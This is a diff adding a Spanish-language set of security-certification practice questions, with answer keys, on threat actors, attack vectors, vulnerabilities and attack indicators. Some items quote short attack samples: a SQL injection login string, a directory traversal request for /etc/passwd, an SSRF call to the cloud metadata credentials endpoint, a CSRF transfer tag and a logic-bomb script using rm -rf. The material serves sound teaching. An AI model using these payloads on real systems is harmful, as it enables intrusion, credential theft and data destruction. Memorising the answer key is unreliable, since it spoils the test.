@@ -1,0 +1,1246 @@
+[
+  {
+    "id": "D2-001",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Un grupo de adolescentes descarga desde un foro un script de explotación ya hecho y lo usa para modificar la página principal de un sitio municipal. No dejan ningún mensaje político; solo publican capturas en redes sociales para presumir. ¿Qué tipo de actor de amenaza describe MEJOR este escenario?",
+    "options": [
+      "Organized crime",
+      "Hacktivist",
+      "Unskilled attacker",
+      "Nation-state"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Un unskilled attacker usa herramientas y exploits creados por otros, con poca sofisticación y recursos, a menudo por notoriedad. No hay motivación política (hacktivist), ni financiera estructurada (organized crime), ni los recursos y objetivos estratégicos de un nation-state."
+  },
+  {
+    "id": "D2-002",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un contratista de defensa descubre que un atacante ha permanecido 14 meses dentro de su red usando exploits zero-day personalizados e infraestructura de comando y control dedicada. Solo se extrajeron planos de investigación de un nuevo sistema de radar; no hubo demanda de rescate. ¿Qué actor de amenaza es el MÁS probable?",
+    "options": [
+      "Hacktivist",
+      "Insider threat",
+      "Nation-state",
+      "Organized crime"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "La larga permanencia (APT), los zero-days personalizados y el enfoque en propiedad intelectual militar indican un nation-state con gran financiamiento y motivación de espionaje. Organized crime buscaría ganancia financiera, un hacktivist publicitaría su causa y nada sugiere un insider."
+  },
+  {
+    "id": "D2-003",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un hospital sufre el cifrado de sus servidores. La nota de rescate incluye un portal de \"atención al cliente\", un plazo de pago en criptomonedas y menciona un programa de afiliados que comparte las ganancias. ¿Qué actor de amenaza y motivación describen MEJOR este incidente?",
+    "options": [
+      "Hacktivist con motivación filosófica/política",
+      "Organized crime con motivación de ganancia financiera",
+      "Nation-state con motivación de espionaje",
+      "Unskilled attacker con motivación de caos"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "La estructura empresarial (Ransomware-as-a-Service, afiliados, soporte a víctimas) y la exigencia de pago son característicos del crimen organizado motivado por dinero. Un nation-state priorizaría el espionaje o la disrupción estratégica, un hacktivist una causa y un unskilled attacker no tendría esa organización."
+  },
+  {
+    "id": "D2-004",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "El departamento de marketing contrata con una tarjeta corporativa un servicio SaaS para compartir archivos con agencias externas, sin informar ni pedir aprobación al área de TI. ¿Qué término describe MEJOR esta situación?",
+    "options": [
+      "Hacktivism",
+      "Shadow IT",
+      "Insider threat malicioso",
+      "Supply chain attack"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Shadow IT es el uso de tecnología o servicios sin la aprobación ni el control de TI, lo que crea superficies de ataque no gestionadas. No hay intención maliciosa (insider malicioso), ni compromiso de un proveedor (supply chain), ni motivación ideológica."
+  },
+  {
+    "id": "D2-005",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Tras ser excluido de una promoción, un administrador de bases de datos elimina en la madrugada los respaldos de producción. No intenta vender información ni pide nada a cambio; deja una nota diciendo que la empresa \"se lo merecía\". ¿Cuál es la motivación MÁS probable?",
+    "options": [
+      "Revenge",
+      "Espionage",
+      "Blackmail",
+      "Financial gain"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "La acción responde a un agravio personal sin beneficio económico ni exigencias, lo que indica venganza (revenge). Blackmail implicaría una exigencia a cambio de no causar daño, financial gain una ganancia económica y espionage la obtención encubierta de información."
+  },
+  {
+    "id": "D2-006",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Un analista compara dos grupos externos con motivación política. El grupo A realiza ataques DDoS con herramientas públicas durante protestas. El grupo B desarrolla malware propio, compra zero-days y mantiene infraestructura durante años. ¿Qué atributo de los actores de amenaza explica MEJOR la diferencia entre ambos?",
+    "options": [
+      "Uso de shadow IT",
+      "Ubicación interna o externa (internal/external)",
+      "Recursos/financiamiento (resources/funding)",
+      "Motivación filosófica/política"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Ambos son externos y comparten motivación política; lo que los diferencia es el nivel de recursos y financiamiento, que habilita mayor sofisticación (zero-days, infraestructura persistente). Shadow IT no es un atributo de actores de amenaza externos."
+  },
+  {
+    "id": "D2-007",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "multi",
+    "difficulty": 1,
+    "stem": "¿Qué características describen MEJOR a un hacktivist? (Elige DOS.)",
+    "options": [
+      "Siempre es un empleado interno de la organización atacada",
+      "Está motivado por creencias filosóficas, políticas o sociales",
+      "Su objetivo principal es la ganancia financiera mediante extorsión",
+      "Opera principalmente como herramienta de TI no autorizada por la empresa",
+      "Suele recurrir a defacement, DDoS o filtración de datos para dar visibilidad a su causa",
+      "Normalmente dispone de más financiamiento que un nation-state"
+    ],
+    "answer": [
+      1,
+      4
+    ],
+    "explanation": "Los hacktivists actúan por causas ideológicas y buscan notoriedad con ataques visibles como defacement, DDoS o filtraciones. No suelen tener los recursos de un nation-state, la ganancia financiera es propia del crimen organizado, pueden ser externos y shadow IT es un concepto distinto."
+  },
+  {
+    "id": "D2-008",
+    "domain": 2,
+    "objective": "2.1",
+    "type": "match",
+    "difficulty": 2,
+    "stem": "Empareja cada escenario con la motivación del actor de amenaza que MEJOR lo describe.",
+    "items": [
+      "Un agente extranjero se infiltra para robar los diseños de un nuevo producto.",
+      "Un colectivo filtra documentos internos para protestar contra la deforestación causada por una minera.",
+      "Un grupo ataca la red eléctrica de un país adversario durante un conflicto armado.",
+      "Un atacante obtiene fotos privadas de un ejecutivo y exige un pago para no publicarlas.",
+      "Un actor borra datos al azar en varias empresas sin exigir nada, solo para provocar desorden.",
+      "Un investigador encuentra una vulnerabilidad y la reporta al fabricante sin pedir pago."
+    ],
+    "choices": [
+      "War",
+      "Blackmail",
+      "Espionage",
+      "Disruption/chaos",
+      "Philosophical/political",
+      "Ethical"
+    ],
+    "answer": [
+      2,
+      4,
+      0,
+      1,
+      3,
+      5
+    ],
+    "explanation": "Atacar infraestructura en un conflicto es war; exigir pago a cambio de no publicar es blackmail; robar diseños de forma encubierta es espionage; dañar sin objetivo ni exigencia es disruption/chaos; filtrar por una causa es philosophical/political; reportar responsablemente sin beneficio es ethical."
+  },
+  {
+    "id": "D2-009",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Varios empleados reciben un mensaje de texto: \"Su paquete no pudo entregarse. Actualice su dirección en http://entregas-mx.co/r?id=8812\". ¿Qué tipo de ataque es este?",
+    "options": [
+      "Watering hole",
+      "Vishing",
+      "Pretexting",
+      "Smishing"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Smishing es phishing a través de SMS. Vishing usa llamadas de voz, pretexting es la construcción de una historia falsa (puede acompañar a cualquier vector) y watering hole compromete un sitio que las víctimas visitan habitualmente."
+  },
+  {
+    "id": "D2-010",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "El director financiero recibe un correo desde la cuenta legítima del CEO, que fue comprometida días antes. El mensaje pide transferir con urgencia USD 85,000 a la \"nueva cuenta bancaria\" de un proveedor conocido y solicita discreción. ¿Qué tipo de ataque es el MÁS probable?",
+    "options": [
+      "Brand impersonation",
+      "Typosquatting",
+      "Business email compromise (BEC)",
+      "Watering hole"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "BEC usa cuentas de correo empresariales comprometidas o suplantadas para engañar a empleados y obtener transferencias o datos. Aquí no hay un dominio mal escrito (typosquatting), ni suplantación de una marca ante clientes, ni compromiso de un sitio web frecuentado."
+  },
+  {
+    "id": "D2-011",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un atacante quiere comprometer a ingenieros de varias empresas de energía. En lugar de atacarlas directamente, inyecta un exploit en un foro técnico especializado que esos ingenieros visitan a diario. ¿Qué técnica está utilizando?",
+    "options": [
+      "Business email compromise",
+      "Watering hole",
+      "Typosquatting",
+      "Pretexting"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Un ataque watering hole compromete un sitio legítimo que el grupo objetivo visita con frecuencia, esperando que las víctimas lleguen a él. Typosquatting depende de errores al escribir dominios, pretexting de historias falsas y BEC del correo empresarial."
+  },
+  {
+    "id": "D2-012",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Un atacante registra los dominios `amaz0n-pagos.com` y `amazon-pgos.com` para recibir el tráfico de usuarios que escriben mal la dirección y presentarles una página falsa de inicio de sesión. ¿Qué técnica describe MEJOR esta acción?",
+    "options": [
+      "Typosquatting",
+      "DNS cache poisoning",
+      "Watering hole",
+      "Vishing"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Typosquatting (URL hijacking) consiste en registrar dominios con errores tipográficos comunes para capturar a usuarios que se equivocan al escribir. DNS poisoning altera la resolución de un dominio legítimo, watering hole compromete un sitio real y vishing usa llamadas."
+  },
+  {
+    "id": "D2-013",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Clientes de una aerolínea reportan una cuenta en redes sociales con el logotipo, los colores y el tono de comunicación oficiales que ofrece \"vuelos gratis\" a cambio de llenar un formulario con datos de tarjeta. El nombre de la cuenta no usa ningún dominio web. ¿Qué técnica se está utilizando?",
+    "options": [
+      "Watering hole",
+      "Business email compromise",
+      "Typosquatting",
+      "Brand impersonation"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Brand impersonation imita la identidad visual y el estilo de una marca para engañar a sus clientes. No hay registro de dominios mal escritos (typosquatting), ni compromiso de correo empresarial interno (BEC), ni sitio legítimo comprometido (watering hole)."
+  },
+  {
+    "id": "D2-014",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Una persona con uniforme de una empresa de aire acondicionado llega a la recepción con una orden de trabajo impresa y explica que debe revisar \"urgentemente\" el equipo del cuarto de servidores porque el gerente de instalaciones lo programó. ¿Cómo se denomina la historia fabricada que usa para justificar su acceso?",
+    "options": [
+      "Typosquatting",
+      "Smishing",
+      "Pretexting",
+      "Watering hole"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Pretexting es crear un escenario o pretexto creíble para convencer a la víctima de dar acceso o información. Watering hole y typosquatting son técnicas web, y smishing se realiza por SMS."
+  },
+  {
+    "id": "D2-015",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Una empresa evalúa dos herramientas de administración remota. La opción 1 requiere instalar un agente persistente con privilegios en cada equipo. La opción 2 es agentless y se conecta mediante protocolos existentes del sistema operativo. Desde la perspectiva de superficie de ataque, ¿qué afirmación es la MÁS precisa?",
+    "options": [
+      "La solución agentless elimina por completo las vulnerabilidades, ya que no se instala software",
+      "La solución client-based agrega en cada equipo un software que puede tener vulnerabilidades propias y debe parcharse y mantenerse en todos los endpoints",
+      "La solución client-based reduce la superficie de ataque porque el agente siempre cifra sus comunicaciones",
+      "La solución agentless no puede ser explotada de forma remota porque no expone ningún servicio"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "El software client-based introduce un componente vulnerable adicional en cada endpoint, ampliando la superficie de ataque y la carga de parcheo. Agentless reduce ese riesgo, pero no elimina vulnerabilidades: depende de servicios y credenciales de acceso remoto que también pueden ser atacados; el cifrado no elimina las fallas del propio agente."
+  },
+  {
+    "id": "D2-016",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Atacantes comprometen la plataforma de monitoreo y administración remota (RMM) de un proveedor de servicios administrados y la usan para desplegar ransomware en decenas de clientes de ese proveedor al mismo tiempo. ¿Qué vector de amenaza se explotó?",
+    "options": [
+      "Insider threat",
+      "Watering hole",
+      "Supply chain",
+      "Removable device"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Comprometer a un MSP de confianza para llegar a sus clientes es un ataque de supply chain: el acceso legítimo del proveedor se convierte en vector. En SY0-701, los MSP se incluyen explícitamente entre los vectores de supply chain (junto con vendors y suppliers). No se compromete un sitio web visitado (watering hole), no hay empleados internos maliciosos ni uso de medios extraíbles."
+  },
+  {
+    "id": "D2-017",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Un competidor contrata a una red de cuentas falsas para difundir deliberadamente en redes sociales que la aplicación de una fintech \"filtra datos bancarios\", algo que sabe que es falso, con el fin de dañar su reputación. ¿Qué describe MEJOR esta campaña?",
+    "options": [
+      "Disinformation",
+      "Misinformation",
+      "Watering hole",
+      "Brand impersonation"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Disinformation es información falsa difundida intencionalmente para engañar o causar daño. Misinformation es información incorrecta compartida sin intención maliciosa; aquí el origen es deliberado. No se imita la marca (brand impersonation) ni se compromete un sitio (watering hole)."
+  },
+  {
+    "id": "D2-018",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "multi",
+    "difficulty": 2,
+    "stem": "Durante una prueba de penetración interna se obtiene el siguiente resultado:\n```\nPORT    STATE  SERVICE\n23/tcp  open   telnet\n80/tcp  open   http\n[+] 10.10.4.1:23 - Login successful: admin/admin\n```\n¿Qué DOS vectores de amenaza se evidencian? (Elige DOS.)",
+    "options": [
+      "Open service ports",
+      "Typosquatting",
+      "Image-based",
+      "Removable device",
+      "Bluetooth",
+      "Default credentials"
+    ],
+    "answer": [
+      0,
+      5
+    ],
+    "explanation": "El servicio Telnet expuesto es un open service port innecesario e inseguro, y el acceso con admin/admin demuestra credenciales predeterminadas sin cambiar. Bluetooth, vectores basados en imágenes, medios extraíbles y typosquatting no aparecen en la evidencia."
+  },
+  {
+    "id": "D2-019",
+    "domain": 2,
+    "objective": "2.2",
+    "type": "match",
+    "difficulty": 2,
+    "stem": "Empareja cada escenario con el vector de amenaza correspondiente.",
+    "items": [
+      "Un usuario recibe una llamada de su \"banco\" pidiendo el código que acaba de llegarle por SMS.",
+      "Un archivo SVG enviado por chat contiene JavaScript incrustado que se ejecuta al abrirlo en el navegador.",
+      "Un correo incluye un documento de Office con macros que descargan malware.",
+      "Se encuentran memorias USB con la etiqueta \"Nómina 2026\" en el estacionamiento de la empresa.",
+      "Una estación HMI de la planta sigue operando con Windows XP, para el que el fabricante ya no publica actualizaciones de seguridad.",
+      "Un empleado se conecta a una red Wi-Fi abierta y sin cifrado en una cafetería para acceder a sistemas internos."
+    ],
+    "choices": [
+      "Image-based",
+      "Removable device",
+      "File-based",
+      "Voice call",
+      "Unsecure networks",
+      "Unsupported systems"
+    ],
+    "answer": [
+      3,
+      0,
+      2,
+      1,
+      5,
+      4
+    ],
+    "explanation": "El SVG con código es image-based; las USB abandonadas son removable device (baiting); el documento con macros es file-based; la llamada fraudulenta es voice call (vishing); la Wi-Fi abierta es una unsecure network; y el equipo con Windows XP es un unsupported system, ya que sus vulnerabilidades nunca se corregirán."
+  },
+  {
+    "id": "D2-020",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un programa con privilegios verifica que el usuario tenga permiso sobre `/tmp/reporte.txt` y, milisegundos después, abre el archivo para escribir. Un atacante reemplaza el archivo por un enlace simbólico a `/etc/shadow` justo entre ambas operaciones. ¿Qué vulnerabilidad se está explotando?",
+    "options": [
+      "Race condition de tipo time-of-check to time-of-use (TOC/TOU)",
+      "Malicious update",
+      "Memory injection",
+      "Buffer overflow"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "TOC/TOU es una race condition en la que el estado de un recurso cambia entre el momento en que se verifica y el momento en que se usa. No se desborda memoria (buffer overflow), no se inyecta código en un proceso (memory injection) ni se distribuye una actualización maliciosa."
+  },
+  {
+    "id": "D2-021",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Una aplicación en C copia la entrada del usuario en un arreglo de 64 bytes sin validar la longitud. Un atacante envía 600 bytes que sobrescriben la dirección de retorno de la función. ¿Qué tipo de vulnerabilidad es esta?",
+    "options": [
+      "SQL injection",
+      "Buffer overflow",
+      "Race condition",
+      "Resource reuse"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Escribir más datos de los que caben en un búfer y sobrescribir memoria adyacente (como la dirección de retorno) es un buffer overflow. SQL injection afecta consultas a bases de datos, una race condition depende de la temporización y resource reuse de recursos reasignados sin limpiar."
+  },
+  {
+    "id": "D2-022",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "El EDR alerta que un proceso desconocido abrió un handle a `explorer.exe`, reservó memoria con permisos de ejecución dentro de él y creó un hilo remoto para ejecutar código. No se escribió ningún archivo nuevo en disco. ¿Qué vulnerabilidad o técnica describe MEJOR esta actividad?",
+    "options": [
+      "Memory injection",
+      "Side loading",
+      "Resource reuse",
+      "Race condition"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Memory injection introduce código malicioso en el espacio de memoria de un proceso legítimo para ejecutarlo con su identidad y evadir la detección, a menudo sin archivos en disco. Side loading es instalar apps fuera de la tienda oficial; race condition y resource reuse no implican inyección de código."
+  },
+  {
+    "id": "D2-023",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un fabricante de software legítimo sufre la intrusión de su servidor de compilación. La siguiente versión de su producto, firmada digitalmente con el certificado del fabricante, se distribuye automáticamente a miles de clientes con una puerta trasera incluida. ¿Qué tipo de vulnerabilidad de aplicación se materializó?",
+    "options": [
+      "Malicious update",
+      "Jailbreaking",
+      "Zero-day",
+      "Buffer overflow"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Un malicious update es una actualización aparentemente legítima (incluso firmada) que contiene código malicioso, normalmente por compromiso del proceso de desarrollo o distribución. No se explota una falla desconocida en el código (zero-day), un desbordamiento de memoria ni la eliminación de restricciones de un dispositivo móvil."
+  },
+  {
+    "id": "D2-024",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Un atacante con acceso a una máquina virtual en un servidor compartido explota una falla del hipervisor y logra ejecutar comandos en el host físico, desde donde accede a otras máquinas virtuales. ¿Qué vulnerabilidad se explotó?",
+    "options": [
+      "Side loading",
+      "Directory traversal",
+      "Resource reuse",
+      "VM escape"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "VM escape ocurre cuando un atacante rompe el aislamiento de una máquina virtual para interactuar con el hipervisor u otras VM. Resource reuse se refiere a datos residuales en recursos reasignados, side loading a apps móviles y directory traversal a rutas de archivos en aplicaciones web."
+  },
+  {
+    "id": "D2-025",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Al aprovisionar un nuevo volumen de almacenamiento en un proveedor de nube pública, un analista forense encuentra fragmentos legibles de datos de facturación que pertenecen a otro cliente del proveedor. ¿Qué vulnerabilidad de virtualización describe MEJOR este hallazgo?",
+    "options": [
+      "Race condition",
+      "VM escape",
+      "Firmware vulnerability",
+      "Resource reuse"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Resource reuse ocurre cuando memoria o almacenamiento se reasigna a otro inquilino sin sanitizarse, exponiendo datos residuales. VM escape implica romper el aislamiento activamente; aquí el analista solo recibió un recurso con datos previos. Las race conditions y las fallas de firmware no explican el hallazgo."
+  },
+  {
+    "id": "D2-026",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Un empleado descarga un archivo APK desde un sitio web de terceros para instalar una versión \"premium gratuita\" de una aplicación en su teléfono Android corporativo, sin usar la tienda oficial. ¿Cómo se denomina esta práctica?",
+    "options": [
+      "Memory injection",
+      "Jailbreaking",
+      "Side loading",
+      "Malicious update"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Side loading es instalar aplicaciones desde fuentes distintas a la tienda oficial, evitando sus controles de revisión. Jailbreaking es eliminar las restricciones del sistema operativo (principalmente iOS); aquí el usuario no modificó el sistema. No hay actualización maliciosa ni inyección en memoria."
+  },
+  {
+    "id": "D2-027",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Se publica un CVE crítico para el firmware de los switches de núcleo de una empresa. Hace dos años el fabricante dejó de dar soporte a ese modelo y anunció que no publicará más actualizaciones. ¿Qué afirmación describe MEJOR la situación?",
+    "options": [
+      "Es una vulnerabilidad de resource reuse propia de la infraestructura compartida",
+      "Es una vulnerabilidad de hardware end-of-life: la falla es conocida, pero nunca se corregirá y requiere controles compensatorios o reemplazo",
+      "Es una vulnerabilidad zero-day porque no existe un parche disponible",
+      "Es una misconfiguration que se corrige ajustando la configuración actual del switch"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "El equipo EOL no recibirá parches de firmware, por lo que la vulnerabilidad persistirá; se deben aplicar controles compensatorios (segmentación, monitoreo) y planear el reemplazo. No es zero-day, porque la falla ya es conocida y fue publicada; tampoco es un error de configuración ni resource reuse."
+  },
+  {
+    "id": "D2-028",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "multi",
+    "difficulty": 2,
+    "stem": "Una auditoría de la cuenta de nube de una empresa revela:\n```\n- Bucket \"respaldos-clientes\": lectura pública habilitada\n- Security group sg-web: 0.0.0.0/0 -> TCP 22 (SSH) permitido\n- Cuenta root sin MFA y con claves de acceso activas\n```\n¿Qué DOS categorías de vulnerabilidad describen MEJOR estos hallazgos? (Elige DOS.)",
+    "options": [
+      "Firmware",
+      "Zero-day",
+      "Race condition",
+      "Misconfiguration",
+      "Cloud-specific",
+      "Side loading"
+    ],
+    "answer": [
+      3,
+      4
+    ],
+    "explanation": "Todos los hallazgos son configuraciones inseguras (misconfiguration) en servicios propios de la nube, como buckets, security groups y la cuenta root (cloud-specific). No hay fallas desconocidas (zero-day), apps móviles, problemas de temporización ni de firmware."
+  },
+  {
+    "id": "D2-029",
+    "domain": 2,
+    "objective": "2.3",
+    "type": "match",
+    "difficulty": 2,
+    "stem": "Empareja cada hallazgo con el tipo de vulnerabilidad que MEJOR lo describe.",
+    "items": [
+      "Una falla en el kernel permite a cualquier usuario local obtener privilegios de SYSTEM, sin importar qué aplicaciones estén instaladas.",
+      "Atacantes explotan una falla que el fabricante desconocía y para la cual no existe parche.",
+      "Una aplicación cifra datos con DES y almacena contraseñas con MD5 sin salt.",
+      "Un proveedor entrega servidores cuyo firmware de la placa base fue alterado antes de llegar al cliente.",
+      "Un iPhone corporativo tiene eliminadas las restricciones de iOS para instalar herramientas no autorizadas.",
+      "Un comentario publicado en un foro ejecuta JavaScript en el navegador de cada visitante."
+    ],
+    "choices": [
+      "Supply chain",
+      "Jailbreaking",
+      "Zero-day",
+      "Cryptographic",
+      "Cross-site scripting (XSS)",
+      "OS-based"
+    ],
+    "answer": [
+      5,
+      2,
+      3,
+      0,
+      1,
+      4
+    ],
+    "explanation": "El firmware alterado antes de la entrega es supply chain; eliminar las restricciones de iOS es jailbreaking; una falla desconocida y sin parche es zero-day; DES y MD5 sin salt son algoritmos débiles (cryptographic); el script en un comentario es XSS almacenado; y la falla del kernel es una vulnerabilidad OS-based que afecta a todo lo que corre sobre el sistema."
+  },
+  {
+    "id": "D2-030",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "Un analista revisa los registros del servidor web y encuentra:\n```\nPOST /login.php HTTP/1.1\nusername=admin' OR 1=1--&password=x\nHTTP/1.1 302 Found  Location: /dashboard.php\n```\n¿Qué ataque se realizó?",
+    "options": [
+      "Cross-site scripting (XSS)",
+      "SQL injection",
+      "Directory traversal",
+      "Cross-site request forgery (CSRF)"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "La cadena `' OR 1=1--` cierra la cadena SQL, agrega una condición siempre verdadera y comenta el resto de la consulta, eludiendo la autenticación (la redirección al dashboard indica éxito). XSS inyecta scripts en el navegador, directory traversal usa `../` y CSRF fuerza solicitudes desde la sesión de la víctima."
+  },
+  {
+    "id": "D2-031",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 1,
+    "stem": "El WAF registra la siguiente solicitud con código de respuesta 200:\n```\nGET /descargas?archivo=../../../../etc/passwd HTTP/1.1\n```\n¿Qué ataque se está intentando?",
+    "options": [
+      "Server-side request forgery (SSRF)",
+      "Buffer overflow",
+      "Command injection",
+      "Directory traversal"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Las secuencias `../` buscan salir del directorio permitido para leer archivos arbitrarios del sistema, como `/etc/passwd`: es directory traversal. No se ejecutan comandos del sistema (command injection), no se fuerza al servidor a hacer peticiones a otros destinos (SSRF) ni se envía una entrada sobredimensionada."
+  },
+  {
+    "id": "D2-032",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Una aplicación permite generar miniaturas a partir de una URL de imagen. En los registros aparece:\n```\nPOST /api/thumbnail\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\nHTTP/1.1 200 OK (1,342 bytes)\n```\n¿Qué ataque es el MÁS probable?",
+    "options": [
+      "Server-side request forgery (SSRF)",
+      "Cross-site scripting (XSS)",
+      "Directory traversal",
+      "Cross-site request forgery (CSRF)"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "El atacante obliga al servidor a hacer una petición a un recurso interno (el servicio de metadatos de la nube) para obtener credenciales: es SSRF. CSRF abusa del navegador de un usuario autenticado, directory traversal manipula rutas de archivos y XSS ejecuta scripts en el navegador de la víctima."
+  },
+  {
+    "id": "D2-033",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Un usuario con sesión activa en la banca en línea visita un foro que contiene la siguiente etiqueta:\n```\n<img src=\"https://banco.example/transferir?destino=4471-889&monto=5000\" width=\"0\" height=\"0\">\n```\nMinutos después detecta una transferencia que no autorizó. ¿Qué ataque ocurrió?",
+    "options": [
+      "Cross-site request forgery (CSRF)",
+      "Replay attack",
+      "Server-side request forgery (SSRF)",
+      "SQL injection"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "CSRF hace que el navegador de un usuario autenticado envíe una solicitud no deseada a un sitio de confianza, aprovechando sus cookies de sesión. En SSRF es el servidor quien realiza la petición; un replay reutiliza tráfico capturado y no hay manipulación de consultas SQL."
+  },
+  {
+    "id": "D2-034",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "El SIEM muestra el siguiente patrón en una hora:\n```\n09:01 FAIL user=agarcia  src=203.0.113.7\n09:01 FAIL user=jmorales src=203.0.113.7\n09:02 FAIL user=lruiz    src=203.0.113.7\n... (412 cuentas distintas, 1 intento cada una, password=\"Primavera2026!\")\n09:58 OK   user=pvega    src=203.0.113.7\n```\n¿Qué ataque es el MÁS probable?",
+    "options": [
+      "Birthday attack",
+      "Brute force",
+      "Credential replay",
+      "Password spraying"
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Probar una sola contraseña común contra muchas cuentas, con pocos intentos por cuenta para evitar bloqueos, es password spraying. Un brute force prueba muchas contraseñas contra una misma cuenta, credential replay reutiliza credenciales o hashes capturados y el birthday attack es un ataque criptográfico contra hashes."
+  },
+  {
+    "id": "D2-035",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Se revisan los registros de autenticación de una usuaria:\n```\n09:02  Login OK   ana.r  IP 189.203.x.x  Guadalajara, MX\n09:05  Logout     ana.r\n09:20  Login OK   ana.r  IP 86.124.x.x   Bucarest, RO\n```\n¿Qué indicador de actividad maliciosa se presenta?",
+    "options": [
+      "Resource inaccessibility",
+      "Concurrent session usage",
+      "Impossible travel",
+      "Out-of-cycle logging"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Es físicamente imposible viajar de Guadalajara a Bucarest en 15 minutos, lo que sugiere credenciales comprometidas: impossible travel. No es concurrent session usage porque la primera sesión se cerró antes de la segunda; tampoco hay registros fuera de ciclo ni recursos inaccesibles."
+  },
+  {
+    "id": "D2-036",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 2,
+    "stem": "Durante una auditoría se encuentra este script programado para ejecutarse cada día a las 02:00 en un servidor de nómina:\n```\n#!/bin/bash\nif ! grep -q \"jlopez\" /etc/passwd; then\n    rm -rf /srv/nomina/*\nfi\n```\n¿Qué tipo de malware es este?",
+    "options": [
+      "Trojan",
+      "Logic bomb",
+      "Rootkit",
+      "Worm"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Una logic bomb ejecuta una acción maliciosa cuando se cumple una condición; aquí, borrar la nómina si la cuenta del empleado deja de existir (por ejemplo, tras su despido). No se autopropaga (worm), no oculta su presencia (rootkit) ni se presenta como software legítimo (trojan)."
+  },
+  {
+    "id": "D2-037",
+    "domain": 2,
+    "objective": "2.4",
+    "type": "single",
+    "difficulty": 3,
+    "stem": "Un servidor muestra tráfico saliente anómalo, pero el Administrador de tareas y `netstat` no muestran procesos ni conexiones sospechosas. Al arrancar desde un medio externo y analizar el disco sin conexión, se encuentra un controlador de kernel no firmado que intercepta llamadas del sistema. ¿Qué tipo de malware es el MÁS probable?",
+    "options": [
+      "Rootkit",
+      "Logic bomb",
+      "Keylogger",
+      "Bloatware"
+    ],
+    "answer": [
+      0
+    ],
